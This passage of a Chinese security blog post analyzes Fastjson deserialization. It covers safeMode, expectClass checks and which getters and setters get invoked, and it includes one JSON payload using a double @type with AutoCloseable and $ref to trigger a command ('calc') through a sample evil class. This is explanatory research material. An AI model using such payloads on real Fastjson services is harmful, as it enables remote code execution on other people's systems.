+    throw new JSONException(&quot;safeMode not support autoType : &quot; + typeName);
+}
+</code></pre>
+<p>@type 这个特殊键完全无用了。</p>
+<p>增加黑名单，还减掉了一个未知的黑名单。</p>
+<h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>当使用 parseObject 解析 JSON，且传入了 expectClass 时，类加载完成后会有这样一个验证：</p>
+<pre><code class="java">if (expectClass != null) {
+    if (expectClass.isAssignableFrom(clazz)) {
+        return clazz;
+    } else {
+        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+    }
+}
+</code></pre>
+<p>用于校验 @type 里面写的和 parseObject 里面写的 expectClass 类之间是不是父子类、接口与其实现之间的关系，而一般开发者写入代码的 expectClass 会是自写类，所以在这种情况下，基于 setter 和  getter 的 Fastjson 利用链基本是无法触发的。想要利用的话，要不该类可以直接利用或连接到其他函数，要不 expectClass 是某一个子类/实现中存在危险操作的类/接口（Throwable、AutoCloseable）。</p>
+<h3 id="题外话-2"><a href="#题外话-2" class="headerlink" title="题外话 2"></a>题外话 2</h3><p>关于 setter 和 getter 的调用，可以观察 JavaBeaninfo 类的 bulid 函数，这里会获取 getter 和 setter 然后加入 fieldList，加入 setter 的代码入下：</p>
+<pre><code class="java">add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,
+                    annotation, fieldAnnotation, null, genericInfo));
+</code></pre>
+<p>setter 自然是都会调用的，主要看 getter 的调用要求：</p>
+<pre><code class="java">// getter 名长度
+if (methodName.length() &lt; 4) {
+    continue;
+}
+// getter 不为静态
+if (Modifier.isStatic(method.getModifiers())) {
+    continue;
+}
+// getter 以 get 开头，且第四位字符为大写
+if (builderClass == null &amp;&amp; methodName.startsWith(&quot;get&quot;) &amp;&amp; Character.isUpperCase(methodName.charAt(3))) {
+
+}
+// getter 无参数
+if (method.getParameterTypes().length != 0) {
+    continue;
+}
+// 返回类型
+if (Collection.class.isAssignableFrom(method.getReturnType()) //
+    || Map.class.isAssignableFrom(method.getReturnType()) //
+    || AtomicBoolean.class == method.getReturnType() //
+    || AtomicInteger.class == method.getReturnType() //
+    || AtomicLong.class == method.getReturnType() //
+   ) {
+
+}
+// 没有 setter
+Field field = TypeUtils.getField(clazz, propertyName, declaredFields);
+if (field != null) {
+    JSONField fieldAnnotation = TypeUtils.getAnnotation(field, JSONField.class);
+    if (fieldAnnotation != null &amp;&amp; !fieldAnnotation.deserialize()) {
+        continue;
+    }
+}
+</code></pre>
+<p>实际上当 parseObject 没有传入 expectClass 时，getter 会全部被调用，这个时候的返回值为 JSONObject，parse 解析完成后还会调用 toJSON：</p>
+<pre><code class="java">Object obj = parse(text);
+if (obj instanceof JSONObject) {
+    return (JSONObject) obj;
+}
+
+try {
+    return (JSONObject) JSON.toJSON(obj);
+}
+</code></pre>
+<p>而 toJSON 会获取所有的 getter：</p>
+<pre><code class="java">// toJSON
+try {
+    Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);
+    for (Map.Entry&lt;String, Object&gt; entry : values.entrySet()) {
+        json.put(entry.getKey(), toJSON(entry.getValue(), config));
+    }
+}
+...
+// getFieldValuesMap
+for (FieldSerializer getter : sortedGetters) {
+    ...
+
+    if (getter.fieldInfo.unwrapped) {
+        Object unwrappedValue = getter.getPropertyValue(object);
+        Object map1 = JSON.toJSON(unwrappedValue);
+        if (map1 instanceof Map) {
+            map.putAll((Map) map1);
+        } else {
+            map.put(getter.fieldInfo.name, getter.getPropertyValue(object));
+        }
+    } else {
+        map.put(getter.fieldInfo.name, getter.getPropertyValue(object));
+    }
+}
+
+return map;
+</code></pre>
+<p>放入 map 时会调用 getPropertyValue：</p>
+<pre><code class="java">public Object getPropertyValue(Object object) throws InvocationTargetException, IllegalAccessException {
+    Object propertyValue =  fieldInfo.get(object);
+    ...
+}
+...
+public Object get(Object javaObject) throws IllegalAccessException, InvocationTargetException {
+    return method != null
+            ? method.invoke(javaObject)
+            : field.get(javaObject);
+}
+</code></pre>
+<p>反射调用 getter。</p>
+<h3 id="题外话-3"><a href="#题外话-3" class="headerlink" title="题外话 3"></a>题外话 3</h3><p>使用 $ref 扩展攻击面，在使用 parse 解析时也可以调用任意 getter：</p>
+<pre><code class="json">{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.example.json.evil.Evil&quot;,&quot;cmd&quot;:&quot;calc&quot;,&quot;result&quot;:{&quot;$ref&quot;:&quot;$.result&quot;}}
+</code></pre>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://paper.seebug.org/1192" target="_blank" rel="noopener">Fastjson 反序列化漏洞史 / 历代 payload</a></p>
+<p><a href="https://paper.seebug.org/1155/" target="_blank" rel="noopener">Fastjson 1.2.66 的 4 个 payload</a></p>
+<p><a href="https://xz.aliyun.com/t/8140" target="_blank" rel="noopener">触发漏洞需要的条件（autoTypeSupport、parse 与 parseObject）</a></p>
+<p><a href="https://paper.seebug.org/1274" target="_blank" rel="noopener">Fastjson 的 getter、setter 调用</a></p>
+<p><a href="https://b1ue.cn/archives/348.html" target="_blank" rel="noopener">发现者的 Fastjson 1.2.68 autotype bypass</a> 和 <a href="https://b1ue.cn/archives/382.html" target="_blank" rel="noopener">挖掘思路</a></p>
+<p><a href="https://y4er.com/post/fastjson-bypass-autotype-1268/" target="_blank" rel="noopener">Fastjson 1.2.68 分析2</a></p>
+<p><a href="https://www.colabug.com/2020/0808/7601917/" target="_blank" rel="noopener">Fastjson 1.2.68 autotype 一个不常见的 bypass poc</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/08/19/用一个缓冲区溢出-bug-绕过-php7-4-3-disable-functions/">
+                        <span>用一个缓冲区溢出 bug 绕过 php7.4.3 disable_functions</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Fastjson反序列化机制和autotype观测&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
